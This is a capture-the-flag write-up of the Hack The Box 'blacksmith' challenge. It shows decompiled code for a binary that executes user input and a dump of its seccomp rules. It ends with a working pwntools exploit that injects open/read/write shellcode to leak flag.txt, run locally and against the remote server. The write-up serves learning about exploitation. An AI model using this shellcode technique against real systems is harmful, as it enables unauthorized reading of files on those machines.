### Binary Exploitation

### Source: HTB

### Description: 

You are the only one who is capable of saving this town and bringing peace upon this land! 
You found a blacksmith who can create the most powerful weapon in the world!
You can find him under the label "./flag.txt".

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ chmod +x blacksmith 
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ file blacksmith    
blacksmith: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a4acbf7f1d36cdce46b8fe897a8ac56d49236d29, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ checksec blacksmith 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/BofLearn/Challs/HTB/blacksmith/blacksmith'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

We're working with a x64 binary whose protection are PIE & Canary

With NX disabled it gives us an opportunity to inject shellcode to the stack and execute it

I'll run it to get an idea of whats happening

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ ./blacksmith
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
> 1
What do you want me to craft?
1. 🗡
2. 🛡
3. 🏹
> 1
This sword can cut through anything! The only thing is, that it is too heavy carry it..
zsh: invalid system call  ./blacksmith
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ ./blacksmith
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
> 1
What do you want me to craft?
1. 🗡
2. 🛡
3. 🏹
> 2
Excellent choice! This luminous shield is empowered with Sun's light! ☀
It will protect you from any attack and it can reflect enemies attacks back!
Do you like your new weapon?
> yes
zsh: segmentation fault  ./blacksmith
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ ./blacksmith
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
> 1
What do you want me to craft?
1. 🗡
2. 🛡
3. 🏹
> 3
This bow's range is the best!
Too bad you do not have enough materials to craft some arrows too..
zsh: invalid system call  ./blacksmith
```

Cool so now i'll decompile using ghidra


```
void main(void)

{
  size_t __n;
  long in_FS_OFFSET;
  int start_option;
  int input;
  char *header1;
  char *header2;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  header1 = "You are worthy to carry this Divine Weapon and bring peace to our homeland!\n";
  header2 = "This in not a weapon! Do not try to mock me!\n";
  puts("Traveler, I need some materials to fuse in order to create something really powerful!");
  printf(
        "Do you have the materials I need to craft the Ultimate Weapon?\n1. Yes, everything is here! \n2. No, I did not manage to bring them all!\n> "
        );
  __isoc99_scanf(&DAT_00101299,&start_option);
  if (start_option != 1) {
    puts("Farewell traveler! Come back when you have all the materials!");
                    /* WARNING: Subroutine does not return */
    exit(0x22);
  }
  printf(&DAT_001012e0);
  __isoc99_scanf(&DAT_00101299,&input);
  sec();
  if (input == 2) {
    shield();
  }
  else if (input == 3) {
    bow();
  }
  else {
    if (input != 1) {
      __n = strlen(header2);
      write(1,header2,__n);
                    /* WARNING: Subroutine does not return */
      exit(0x105);
    }
    sword();
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We see what the main function does

```
1. Prints the header stuff and receives our input
2. If the input isn't equal to 1 i.e input = 2 it exits
3. But if it is, other options are brought to be selected
```

This function is called in the main function 

```
void sec(void)

{
  long lVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  prctl(0x26,1);
  prctl(4,0);
  uVar2 = seccomp_init(0);
  seccomp_rule_add(uVar2,0x7fff0000,2,0);
  seccomp_rule_add(uVar2,0x7fff0000,0,0);
  seccomp_rule_add(uVar2,0x7fff0000,1,0);
  seccomp_rule_add(uVar2,0x7fff0000,0x3c,0);
  seccomp_load(uVar2);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This just does a seccomp rule hmmmm 🤔

Option 1 decompiled code 

```

void sword(void)

{
  long lVar1;
  size_t __n;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  __n = strlen(
              "This sword can cut through anything! The only thing is, that it is too heavy carry it ..\n"
              );
  write(1,
        "This sword can cut through anything! The only thing is, that it is too heavy carry it..\n",
        __n);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Option 2 decompiled code

```
void shield(void)

{
  size_t length;
  long in_FS_OFFSET;
  undefined input [72];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  length = strlen(&DAT_00101080);
  write(1,&DAT_00101080,length);
  length = strlen("Do you like your new weapon?\n> ");
  write(1,"Do you like your new weapon?\n> ",length);
  read(0,input,0x3f);
  (*(code *)input)();
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Option 3 decompiled code

```

void bow(void)

{
  long lVar1;
  size_t __n;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  __n = strlen(
              "This bow\'s range is the best!\nToo bad you do not have enough materials to craft som e arrows too..\n"
              );
  write(1,
        "This bow\'s range is the best!\nToo bad you do not have enough materials to craft some arro ws too..\n"
        ,__n);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Looking at the functions we can select it shows that there's nothing much happening 

Only the shield function that looks interesting

```
void shield(void)

{
  size_t length;
  long in_FS_OFFSET;
  undefined input [72];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  length = strlen(&DAT_00101080);
  write(1,&DAT_00101080,length);
  length = strlen("Do you like your new weapon?\n> ");
  write(1,"Do you like your new weapon?\n> ",length);
  read(0,input,0x3f);
  (*(code *)input)();
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Here's what it does

```
1. It writes out the question
2. Then receives our input using read and storing it in a 72bytes buffer
3. It then run `code` i.e it executes the input given
4. Does the stack check and exit
```

What we can get from this is that 

```
1. We're given input which can hold up only 0x3f bytes and the input buffer can hold up to 72 bytes.
There isn't any buffer overflow here cause we given lesser amount of bytes to input `72 - int(0x3f) = 21` 
So the buffer has extra 21 bytes it can hold up 
2. Since the input we give is going to be executed as a command, we can still get code execution
```

So here's what i'll do. I'll give an input which will contain shellcode for the binary to execute

But before that i saw some seccomp-rules in the binary

So i'll use a tool to dump the rules [Tool](https://github.com/david942j/seccomp-tools)

Running it i get the dumped rules

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ sudo seccomp-tools dump ./blacksmith
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
> 1
What do you want me to craft?
1. 🗡
2. 🛡
3. 🏹
> 2
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

Cool we see that 

```
1. It checks if the architecture isn't x86_64 and it kills the program process
2. Checks if A is equal to sys_number
3. Checks if A is less than 0x4000000 which then jumps to rule 6
4. It checks if A is read, write, open, exit it allows it
```

So basically with this we won't be able to get a shell cause shellcode uses like execve, and various other linux syscall convention

But the only calling convention allowed is `read, write, open`

This is also good cause we know the path of the flag already from the description of the challenge

And we can bascially do this 

```
1. Open the flag.txt file
2. Read the content of it 
3. Write those bytes to stdout
```

Now i'll be using shellcraft to get various shellcodes to be used

Checking the linux man usage of open, read & write helped also [Resource](https://linux.die.net/man/)

So here's the exploit

```
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
    
# Binary filename
exe = './blacksmith'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Shellcode
shellcode = asm(shellcraft.open('flag.txt')) #opens up the flag
shellcode += asm(shellcraft.read('3', 'rsp', '0x100')) #read the content and save it in $rsp
shellcode += asm(shellcraft.write('1', 'rsp', 'rax')) #write the value for $rsp to $rax

# Send the payload
io.sendlineafter(b'>', '1')
io.sendlineafter(b'>', '2')
io.sendlineafter(b'>', flat(shellcode))

print(io.recv())

flag = io.recv()
success(flag)
```

Running it locally 

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ python2 exploit.py
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Starting local process './blacksmith': pid 365853
 
[+] FLAG{F4K3_Fl4G_F0R_T3ST1NG}
[*] Process './blacksmith' stopped with exit code -11 (SIGSEGV) (pid 365853)
```

It works now on the remote server

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/blacksmith]
└─$ python2 exploit.py REMOTE 46.101.11.94 30245  
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Opening connection to 46.101.11.94 on port 30245: Done
 
[+] HTB{s3cc0mp_1s_t00_s3cur3}
[*] Closed connection to 46.101.11.94 port 30245
```

And we're done

<br> <br>
[Back To Home](../../index.md)

